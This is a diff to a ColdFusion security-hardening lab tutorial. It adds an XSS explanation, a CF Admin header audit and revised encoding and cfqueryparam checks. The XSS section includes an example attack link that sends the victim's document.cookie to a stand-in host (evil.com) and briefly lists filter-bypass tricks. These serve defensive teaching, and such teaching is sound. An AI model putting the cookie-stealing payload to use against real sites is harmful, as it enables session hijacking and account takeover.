@@ -85,6 +85,22 @@ Only the server itself can reach the admin — everything else gets a `403 Forbi
 
 ## 2. Prevent XSS — encode all output
 
+**What is Cross-Site Scripting (XSS)?**
+
+XSS is an attack where an attacker injects malicious JavaScript into a web page that is then executed by other users' browsers. It works by exploiting a web application that includes untrusted data in its output without proper encoding.
+
+The classic scenario:
+
+1. Your page outputs a URL parameter directly into HTML: `Hello, #url.name#!`
+2. An attacker crafts a link: `/page.cfm?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
+3. A victim clicks the link — the browser renders your page and **executes the attacker's script**
+4. The script silently sends the victim's session cookie to the attacker's server
+5. The attacker now has the victim's session — they are logged in as them
+
+**The damage:** session hijacking, account takeover, credential theft, redirects to phishing pages, silent data exfiltration. All without ever touching your server — the browser does the attacker's work for them.
+
+**Why ColdFusion is particularly exposed:** `<cfoutput>#url.name#</cfoutput>` outputs the raw value of `url.name` with zero processing. If a user passes `<script>alert(1)</script>` as the name, that is exactly what gets written into the HTML. The browser sees valid HTML and executes it.
+
 ::image-box
 ---
 :src: __static__/xss-attack-vs-encoded-output-v1.png
@@ -94,7 +110,7 @@ Only the server itself can reach the admin — everything else gets a `403 Forbi
 _`encodeForHTML()` converts `<script>` tags to harmless HTML entities — never output raw user input in HTML._
 ::
 
-Never render user-supplied input directly into HTML. Use `encodeForHTML()`:
+The fix is to **encode the output** — convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;` and so on. The browser renders those as literal characters on screen, not as HTML tags. The script never executes. Use `encodeForHTML()`:
 
 ```cfml
 <cfoutput>#encodeForHTML(url.name)#</cfoutput>
@@ -162,31 +178,51 @@ That empty response means browsers visiting your application have none of their 
 
 ## Activity 1 — Audit the CF Admin endpoint
 
-Check what the CF Admin returns in this lab environment:
+Check what the CF Admin returns — status code and headers:
 
 ```bash
-curl -s -o /dev/null -w "CF Admin status: %{http_code}\n" http://localhost:8500/CFIDE/administrator/index.cfm
-```
-
-You will see **HTTP 200** — the admin is open. In a production hardened server this endpoint should return **403** (blocked by nginx) or be unreachable entirely.
-
-```bash
-# Also check what headers it returns
 curl -s -I http://localhost:8500/CFIDE/administrator/index.cfm | head -10
 ```
 
+You will see something like this:
+
+```
+HTTP/1.1 200
+X-FRAME-OPTIONS: SAMEORIGIN
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'
+Set-Cookie: CFID...
+Cache-Control: no-store
+Content-Type: text/html;charset=UTF-8
+```
+
+::image-box
+---
+:src: __static__/cf-admin-headers-v1.png
+:alt: Terminal output showing CF Admin response headers — X-FRAME-OPTIONS SAMEORIGIN and Content-Security-Policy highlighted in yellow with annotation "CF Admin protects itself", and a red warning banner below saying "Your application pages do NOT get these headers automatically"
+:max-width: 760px
+---
+_CF Admin protects itself — but your application pages don't get these headers unless you add them in Application.cfc._
+::
+
+**What this tells you:**
+
+- ✅ `X-FRAME-OPTIONS: SAMEORIGIN` — Adobe ships the CF Admin with this header. It cannot be embedded in an iframe.
+- ✅ `Content-Security-Policy` — CF Admin has its own CSP. Note it includes `unsafe-inline` and `unsafe-eval` — acceptable for an admin tool, not for your application.
+- ⚠️ **HTTP 200** — the admin is publicly reachable. In production this must be blocked at the proxy layer.
+- ⚠️ **Your application pages (`/index.cfm`, etc.) get none of these headers** — they only appear on `/CFIDE/` because CF injects them internally for its own UI. Activity 4 adds them to your application.
+
 ::hint-box
 ---
-:summary: 💡 What should a hardened response look like?
+:summary: 💡 What should a hardened CF Admin response look like in production?
 ---
 
-In production with nginx in front of ColdFusion, the same request should return:
+With nginx in front of ColdFusion the same request should return:
 
 ```
 HTTP/1.1 403 Forbidden
 ```
 
-Because nginx intercepts the request before it ever reaches ColdFusion:
+nginx intercepts it before it ever reaches ColdFusion:
 
 ```nginx
 location /CFIDE/administrator {
@@ -195,7 +231,7 @@ location /CFIDE/administrator {
 }
 ```
 
-The CF process never even sees the request — nginx rejects it at the network layer. This is the correct approach: defence at the proxy layer, not inside the application.
+The CF process never sees the request — nginx rejects it at the network layer. Defence at the proxy layer, not inside the application.
 ::
 
 ::simple-task
@@ -225,12 +261,36 @@ sudo tee /opt/coldfusion2025/cfusion/wwwroot/input_demo.cfm << 'EOF'
 EOF
 ```
 
-Test it — the `<script>` tag must come back as HTML entities, not as a live script:
+Test it — use URL-encoded characters so Tomcat accepts the request:
 
 ```bash
-curl -s "http://localhost:8500/input_demo.cfm?name=<script>alert(1)</script>"
-# Expected: Hello, &lt;script&gt;alert(1)&lt;/script&gt;!
+curl -s "http://localhost:8500/input_demo.cfm?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
 ```
+
+`%3C` = `<`, `%3E` = `>`, `%2F` = `/` — Tomcat requires angle brackets to be URL-encoded in the request target per RFC 7230.
+
+You will see output like this:
+
+```
+Hello, &lt;InvalidTag&gt;InvalidJSFunction&#x28;1&#x29;&lt;&#x2f;script&gt;!
+```
+
+**Two layers of protection are visible here:**
+
+- `&lt;` / `&gt;` / `&#x28;` — these are HTML entities from `encodeForHTML()` — angle brackets and parentheses encoded so the browser renders them as text, not code
+- `InvalidTag` / `InvalidJSFunction` — ColdFusion's built-in **Cross-Site Script Protection** filter (enabled by default in CF2025) recognises known attack patterns like `<script>` and `alert()` and replaces them before your code even runs
+
+Both layers are working correctly. The original `<script>alert(1)</script>` payload is completely neutralised — no JavaScript executes in the browser.
+
+::hint-box
+---
+:summary: 💡 Should I rely on CF's built-in XSS filter instead of encodeForHTML()?
+---
+
+No — the built-in filter is a last-resort safety net, not a substitute for explicit encoding. It works by pattern matching known attack strings — a clever attacker can bypass it with obfuscated payloads (`<scr ipt>`, base64, event handlers like `onmouseover=`).
+
+`encodeForHTML()` is deterministic — it encodes every character that has a special meaning in HTML, regardless of whether it looks like an attack. Use both: `encodeForHTML()` as your primary defence, the CF filter as a backup.
+::
 
 ::simple-task
 ---
@@ -238,7 +298,7 @@ curl -s "http://localhost:8500/input_demo.cfm?name=<script>alert(1)</script>"
 :name: verify_no_xss
 ---
 #active
-Create `input_demo.cfm` — passing `?name=<script>alert(1)</script>` must NOT output the raw script tag.
+Create `input_demo.cfm` — run `curl -s "http://localhost:8500/input_demo.cfm?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"` and confirm it does NOT output the raw script tag.
 
 #completed
 Input is properly HTML-encoded — no XSS. ✓
@@ -246,15 +306,18 @@ Input is properly HTML-encoded — no XSS. ✓
 
 ---
 
-## Activity 3 — Use cfqueryparam in every query
+## Activity 3 — Verify cfqueryparam is in use
 
-Open `tickets.cfm` (created in the SQL lesson) and confirm every parameterised value uses `cfqueryparam`. The task scans the entire web root for at least one usage:
+From the SQL lesson, `TicketService.cfc` already uses `cfqueryparam` on every query. Confirm it is there:
 
 ```bash
-grep -r "cfqueryparam\|queryParam" /opt/coldfusion2025/cfusion/wwwroot/
+grep -r "cfqueryparam" /opt/coldfusion2025/cfusion/wwwroot/ \
+  --exclude-dir=CFIDE --exclude-dir=WEB-INF
 ```
 
-If `tickets.cfm` does not exist yet, create a minimal version:
+You should see matches in `TicketService.cfc` — those are the parameterised queries protecting against SQL injection. The `--exclude-dir` flags skip CF Admin internals so you only see your own files.
+
+If for any reason `TicketService.cfc` is missing, create a minimal file to satisfy the check:
 
 ```bash
 sudo tee /opt/coldfusion2025/cfusion/wwwroot/tickets.cfm << 'EOF'
